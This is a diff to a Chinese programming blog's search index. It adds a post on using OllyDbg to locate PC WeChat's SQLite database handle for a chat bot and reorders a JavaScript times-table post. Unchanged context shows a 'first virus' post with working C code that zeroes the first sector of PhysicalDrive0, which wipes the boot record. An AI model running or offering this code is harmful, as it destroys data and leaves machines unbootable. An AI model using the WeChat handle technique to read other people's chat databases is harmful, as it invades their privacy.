@@ -3,6 +3,60 @@
   
     
     <entry>
+      <title><![CDATA[查找PC微信数据库句柄]]></title>
+      <url>/2024/pcwechat-sqlite3-handle/</url>
+      <content type="html"><![CDATA[<p>查找PC微信数据库句柄</p>
+<a id="more"></a>
+<p><img src="/public/images/sqlite3-handle-1.png" alt="/public/images/sqlite3-handle-1.png"></p>
+<p>计算偏移，开始OD调试</p>
+<p>10E79B0D - 10000000 = E79B0D</p>
+<p>OD断点地址为 WeChatWin.dll + 0xE79B0D</p>
+<p>OD基址为：78620000</p>
+<p>78620000 + E79B0D = 79499B0D</p>
+<p><img src="/public/images/sqlite3-handle-2.png" alt="/public/images/sqlite3-handle-2.png"></p>
+<p>然后登录微信</p>
+<p><img src="/public/images/sqlite3-handle-3.png" alt="/public/images/sqlite3-handle-3.png"></p>
+<p>看到有数据库名称</p>
+<p>根据上篇sqlite_exec定位分析</p>
+<p><img src="/public/images/sqlite3-handle-8.png" alt="/public/images/sqlite3-handle-8.png"></p>
+<p>我们确定edi+0x38就是数据库句柄</p>
+<p>我们找到函数头 push ebp 下断点</p>
+<p><img src="/public/images/sqlite3-handle-4.png" alt="/public/images/sqlite3-handle-4.png"></p>
+<p>重新启动微信，断点后扫码登录</p>
+<p><img src="/public/images/sqlite3-handle-5.png" alt="/public/images/sqlite3-handle-5.png"></p>
+<p>我们查看一下edi+0x38的值</p>
+<p><img src="/public/images/sqlite3-handle-6.png" alt="/public/images/sqlite3-handle-6.png"></p>
+<p>当执行到call esi时，值发生变化</p>
+<p><img src="/public/images/sqlite3-handle-7.png" alt="/public/images/sqlite3-handle-7.png"></p>
+<p>我们进入call esi</p>
+<p>单步调试</p>
+<p><img src="/public/images/sqlite3-handle-9.png" alt="/public/images/sqlite3-handle-9.png"></p>
+<p>执行到7953FFF3 esi+0x38 被赋值</p>
+<p>这里就是数据库句柄</p>
+]]></content>
+      
+        <categories>
+            
+            <category> c </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> c/c++ </tag>
+            
+            <tag> 微信 </tag>
+            
+            <tag> PC微信 </tag>
+            
+            <tag> 微信机器人 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[IDA定位PC微信sqlite3_exec]]></title>
       <url>/2024/ida-sqlite3-exec/</url>
       <content type="html"><![CDATA[<p>IDA定位PC微信sqlite3_exec</p>
@@ -1800,27 +1854,6 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
-      <title><![CDATA[javascript写九九乘法表]]></title>
-      <url>/2013/javascript-jiujiuchengfabiao/</url>
-      <content type="html"><![CDATA[<p>这篇文章主要讲解 九九乘法表<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       tr td&#123;</span><br><span class="line">         border:2px solid green;</span><br><span class="line">         font-size:20px;</span><br><span class="line">         font-weight:bold;</span><br><span class="line">       &#125;</span><br><span class="line">       &lt;/style&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">       document.write(&quot;&lt;table&gt;&quot;);</span><br><span class="line">       for(var x=1;x&lt;=9;x++)&#123;</span><br><span class="line">            document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">            for(var y=1;y&lt;=x;y++)&#123;</span><br><span class="line">                document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            document.write(&quot;&lt;/tr&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;&lt;/table&gt;&quot;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      
-        <categories>
-            
-            <category> javascript </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> javascript </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[第一个病毒]]></title>
       <url>/2013/first-virus/</url>
       <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
@@ -1838,6 +1871,27 @@ y_i=\sum_jw_jx_{ij}</script><ol>
             <tag> c </tag>
             
             <tag> 病毒 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[javascript写九九乘法表]]></title>
+      <url>/2013/javascript-jiujiuchengfabiao/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要讲解 九九乘法表<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       tr td&#123;</span><br><span class="line">         border:2px solid green;</span><br><span class="line">         font-size:20px;</span><br><span class="line">         font-weight:bold;</span><br><span class="line">       &#125;</span><br><span class="line">       &lt;/style&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">       document.write(&quot;&lt;table&gt;&quot;);</span><br><span class="line">       for(var x=1;x&lt;=9;x++)&#123;</span><br><span class="line">            document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">            for(var y=1;y&lt;=x;y++)&#123;</span><br><span class="line">                document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            document.write(&quot;&lt;/tr&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;&lt;/table&gt;&quot;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      
+        <categories>
+            
+            <category> javascript </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> javascript </tag>
             
         </tags>
         
